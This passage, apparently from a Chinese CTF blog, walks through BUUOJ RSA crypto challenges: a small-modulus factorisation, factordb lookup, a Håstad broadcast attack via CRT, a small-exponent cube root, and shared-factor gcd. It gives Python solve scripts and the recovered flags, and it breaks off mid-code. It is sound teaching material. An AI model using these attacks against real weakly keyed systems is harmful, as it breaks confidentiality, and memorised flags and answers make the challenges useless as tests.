请不要删除上方代码，否则包含中文时无法运行</span><span class="token keyword">import</span> hashlibd <span class="token operator">=</span> <span class="token number">8920758995414587152829426558580025657357328745839747693739591820283538307445</span>flag <span class="token operator">=</span> <span class="token string">"flag&#123;"</span> <span class="token operator">+</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;47bf28da384590448e0b0d23909a25a4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-RSA大整数分解-RSAROLL"><a href="#5-RSA大整数分解-RSAROLL" class="headerlink" title="5.RSA大整数分解-RSAROLL"></a>5.RSA大整数分解-RSAROLL</h2><p>下面是数据(密文)</p><p>给了n、e分别为<code>&#123;920139713,19&#125;</code><br>然后下面是数据(密文)</p><pre class="line-numbers language-none"><code class="language-none">70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给出了N和e</p><pre class="line-numbers language-none"><code class="language-none">&#123;920139713,19&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解出p、q，</p><pre class="line-numbers language-none"><code class="language-none">&#123;920139713 &#x3D; 18443 * 49891&#125;p, q &#x3D; 18443, 49891<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#-----------------------------------------------------.</span><span class="token comment"># @Author  : M4XLMUM                                  |</span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn |</span><span class="token comment">#-----------------------------------------------------.</span><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">18443</span> q <span class="token operator">=</span> <span class="token number">49891</span>e <span class="token operator">=</span> <span class="token number">19</span>n <span class="token operator">=</span> <span class="token number">920139713</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\ctf题目\buuoj\crypto\RSAROLL\RsaRoll\data.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>lines <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag&#123;13212je2ue28fy71w8u87y31r78eu1e2&#125;</code></p><h2 id="6-WUSTCTF2020-babyrsa"><a href="#6-WUSTCTF2020-babyrsa" class="headerlink" title="6.[WUSTCTF2020]babyrsa"></a>6.[WUSTCTF2020]babyrsa</h2><p>在线分解大整数n即可，没什么好说的，上脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumc <span class="token operator">=</span> <span class="token number">28767758880940662779934612526152562406674613203406706867456395986985664083182</span>n <span class="token operator">=</span> <span class="token number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span>p <span class="token operator">=</span> <span class="token number">189239861511125143212536989589123569301</span>  <span class="token comment"># 上factordb.com解一下粘过来一个就行了</span>e <span class="token operator">=</span> <span class="token number">65537</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""823989108254974202105161758566497786100048618619858843500160755662795645b'wctf2020&#123;just_@_piece_0f_cak3&#125;'flag&#123;just_@_piece_0f_cak3&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="低加密指数广播攻击-RSA4"><a href="#低加密指数广播攻击-RSA4" class="headerlink" title="低加密指数广播攻击-RSA4"></a>低加密指数广播攻击-RSA4</h2><p>首先要用到中国剩余定理，就是下面的形式可以计算求得x</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504202243816.png" alt="image-20210504202243816"></p><p>这里的x与rsa中的m可以对应，n对应该式中的[3,5,7]，c^e对应这里面的[2,4,6]。。。有下面的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">chinese_remainder</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>    prod <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> a <span class="token operator">*</span> b<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">for</span> n_i<span class="token punctuation">,</span> a_i <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> prod <span class="token operator">//</span> n_i        <span class="token builtin">sum</span> <span class="token operator">+=</span> a_i <span class="token operator">*</span> sympy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> n_i<span class="token punctuation">)</span> <span class="token operator">*</span> p    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">%</span> prod<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里对应的解式为<img src="/2020/11/25/BUUOJ-crypto/image-20210504203213083.png" alt="image-20210504203213083"></p><p>写下面的解题脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">import</span> sympy<span class="token keyword">def</span> <span class="token function">get_nscs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># ns列表中存的是n的值</span>    ns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'题目.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tempdata <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">r'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tempdata <span class="token keyword">and</span> tempdata<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">:</span>                ns<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tempdata<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tempdata <span class="token keyword">and</span> tempdata<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'c'</span><span class="token punctuation">:</span>                cs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tempdata<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ns<span class="token punctuation">,</span> cs<span class="token keyword">def</span> <span class="token function">chinese_remainder</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>    prod <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> a <span class="token operator">*</span> b<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">for</span> n_i<span class="token punctuation">,</span> a_i <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> prod <span class="token operator">//</span> n_i        <span class="token builtin">sum</span> <span class="token operator">+=</span> a_i <span class="token operator">*</span> sympy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> n_i<span class="token punctuation">)</span> <span class="token operator">*</span> p    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">sum</span> <span class="token operator">%</span> prod<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ns<span class="token punctuation">,</span> cs <span class="token operator">=</span> get_nscs<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span>    ns <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ns<span class="token punctuation">)</span><span class="token punctuation">)</span>    cs <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cs<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cs<span class="token punctuation">)</span>    m <span class="token operator">=</span> chinese_remainder<span class="token punctuation">(</span>ns<span class="token punctuation">,</span> cs<span class="token punctuation">)</span>    m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""b'noxCTF&#123;D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!&#125;'flag&#123;D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件内的每个赋值最后要加个空格，我脚本的问题。</p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210504220503296.png" alt="image-20210504220503296"></p><h2 id="7-RSA小公钥指数攻击-Dangerous-RSA"><a href="#7-RSA小公钥指数攻击-Dangerous-RSA" class="headerlink" title="7.RSA小公钥指数攻击-Dangerous RSA"></a>7.RSA小公钥指数攻击-Dangerous RSA</h2><p>首先，RSA的私钥指数指的是其中的参量<code>e</code>，当指数<code>e</code>和明文<code>m</code>足够小时，就能直接根据加密的<code>C = M ^ e % n</code>，得</p><script type="math/tex; mode=display">M = \sqrt[e]{C}</script><p>这里因为</p><script type="math/tex; mode=display">M ^ e < n</script><p>从而这个mod操作并没有起作用，然后直接使用gmpy2库求开三次方的C即可得明文。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn </span><span class="token comment"># @function: e = 3 It will be dangerous</span><span class="token comment"># -----------------------------------------------------</span><span class="token triple-quoted-string string">"""原理:RSA加密原理(算法): C = M ^ e % n解密原理(算法): M = C ^ d % n(其中C为密文，M为明文)e很小时，经常为3，有时可能为2，M ^ e &lt; n ，此时M = \sqrt[e]&#123;C&#125;"""</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x3</span>c <span class="token operator">=</span> <span class="token number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span>n <span class="token operator">=</span> <span class="token number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span>m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故flag为<code>flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125;</code></p><h2 id="8-RSA一个明文多组n与c-RSA5"><a href="#8-RSA一个明文多组n与c-RSA5" class="headerlink" title="8.RSA一个明文多组n与c-RSA5"></a>8.RSA一个明文多组n与c-RSA5</h2><p>因为n的长度大于512了已经，所以大整数拆分应该很难，但是仍可以按下面思路进行解密。</p><p>这个题的思路也很好理解，不过首先要知道这里的公钥指数e、明文m是不变的。那有多组n、c的值，因为每组都有n = p * q，如果两组数据之间存在不为1的公约数的话，那么这个公约数就最有可能是组成n的p、q。由此可求出一组数据的p、q，有p、q能求出phi，进而求出d，进而实现对该组密文的解密。</p><p>这种攻击的偶然性很大，但是数据足够多的情况下可能性会大很多。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">get_nscs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># ns列表中存的是n的值</span>    ns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./1.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tempdata <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">r'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tempdata <span class="token keyword">and</span> tempdata<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span>                ns<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tempdata<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> tempdata <span class="token keyword">and</span> tempdata<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'c'</span><span class="token punctuation">:</span>                cs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tempdata<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ns<span class="token punctuation">,</span> cs<span class="token keyword">def</span> <span class="token function">get_np</span><span class="token punctuation">(</span>ns<span class="token punctuation">,</span> cs<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 传入ns数据数组</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> j<span class="token punctuation">:</span>                <span class="token keyword">continue</span>            p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> ns<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>ns<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 从上面的两组数据中选一组进行下面的计算</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token comment"># 可得公因数，从而拆分大整数。</span>                <span class="token keyword">return</span> ns<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ns<span class="token punctuation">,</span> cs <span class="token operator">=</span> get_nscs<span class="token punctuation">(</span><span class="token punctuation">)</span>    n<span class="token punctuation">,</span> c<span class="token punctuation">,</span> p <span class="token operator">=</span> get_np<span class="token punctuation">(</span>ns<span class="token punctuation">,</span> cs<span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token number">65537</span>    q <span class="token operator">=</span> n <span class="token operator">//</span> p    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""2282203973304938811093677817301476566366330381179128323436123064977580592390217343855392780540746310610469977399415837570403309347176138779985216833789852698052175361430789966901593138781992742187531630459152190159282381441775644769570104584677350862937139701305368455304218572505999679153239162642971241699499088969373280518194797007142930959961497377273655629940424642479166067925388494002172884690634419885477919195173971934290876133066191047711993342855077424291042095249692960568615479948783992342433635374744215357167806452076314979329436078782175170354328869672692390967039682155105304803561949970639111814506719591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499b'flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125;'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125;</code></p><h2 id="9-特殊模数-p、q求法已知-NCTF2019-childRSA"><a href="#9-特殊模数-p、q求法已知-NCTF2019-childRSA" class="headerlink" title="9.特殊模数(p、q求法已知)-[NCTF2019]childRSA"></a>9.特殊模数(p、q求法已知)-[NCTF2019]childRSA</h2><p>首先是他的算法，跟下面的差不多，我没有改关键的部分代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> isPrime<span class="token punctuation">,</span> sieve_base <span class="token keyword">as</span> primesflag <span class="token operator">=</span> <span class="token string">'123456'</span><span class="token keyword">def</span> <span class="token function">getPrime</span><span class="token punctuation">(</span>bits<span class="token 